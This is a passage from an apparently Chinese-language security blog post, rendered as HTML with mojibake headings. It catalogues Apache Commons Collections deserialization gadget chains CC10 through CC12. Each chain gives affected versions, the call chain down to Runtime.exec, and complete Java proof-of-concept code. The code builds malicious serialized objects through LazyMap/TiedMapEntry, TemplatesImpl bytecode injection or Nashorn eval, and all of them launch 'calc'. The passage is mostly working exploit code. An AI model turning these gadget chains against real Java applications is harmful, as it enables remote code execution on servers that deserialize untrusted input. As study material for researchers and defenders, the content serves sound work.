class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections10"><a href="#CommonsCollections10" class="headerlink" title="CommonsCollections10"></a>CommonsCollections10</h2><h3 id="Pre-9"><a href="#Pre-9" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-9"><a href="#ÈôêÂà∂-9" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-9"><a href="#Âà©Áî®Èìæ-9" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Hashtable.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Hashtable.reconstitutionPut<br>    -&gt; key.hashCode<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">TiedMapEntry</span>.<span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> TiedMapEntry.getValue<br>    -&gt; TiedMapEntry.<span class="hljs-keyword">map</span>.get<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">LazyMap</span>.<span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> factory.transform<span class="hljs-function"><span class="hljs-params">()</span> =&gt; <span class="hljs-title">ChainedTransformer</span>.<span class="hljs-title">transform</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span> Runtime.getRuntime().exec()<br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-9"><a href="#ÂÖ≥ÈîÆÁ±ª-9" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">Hashtable</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-9"><a href="#Gadget-9" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC10;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC10</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>);<br>        Field tableF = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] table =(Object[]) tableF.get(ht);<br>        Object entry = table[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(entry==<span class="hljs-keyword">null</span>)&#123;<br>            entry = table[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyF = entry.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(entry,tiedMapEntry);<br>        Field iTransformers = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformers.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections11"><a href="#CommonsCollections11" class="headerlink" title="CommonsCollections11"></a>CommonsCollections11</h2><h3 id="Pre-10"><a href="#Pre-10" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-10"><a href="#ÈôêÂà∂-10" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="ÂÖ≥ÈîÆÁ±ª-10"><a href="#ÂÖ≥ÈîÆÁ±ª-10" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<h4 id="Âà©Áî®Èìæ-10"><a href="#Âà©Áî®Èìæ-10" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>					<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-10"><a href="#Gadget-10" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC11;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span> + System.nanoTime());<br>        ctc.setSuperclass(cp.getCtClass(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        InvokerTransformer fakeinvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakeinvokerTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, templatesimpl);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        Field iMethodNameF = InvokerTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        iMethodNameF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iMethodNameF.set(fakeinvokerTransformer, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections12"><a href="#CommonsCollections12" class="headerlink" title="CommonsCollections12"></a>CommonsCollections12</h2><h3 id="Pre-11"><a href="#Pre-11" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-11"><a href="#ÈôêÂà∂-11" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="ÂÖ≥ÈîÆÁ±ª-11"><a href="#ÂÖ≥ÈîÆÁ±ª-11" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ScriptEngineManager</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br></code></pre></td></tr></table></figure>

<h4 id="Âà©Áî®Èìæ-11"><a href="#Âà©Áî®Èìæ-11" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                    	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span>gey<span class="hljs-constructor">EngineByName()</span><br>                    		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-literal">()</span><br>                    			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-constructor">Impl()</span><br>                   			 		<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h3 id="Gadget-11"><a href="#Gadget-11" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC12;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC12</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(ScriptEngineManager.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;JavaScript&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = 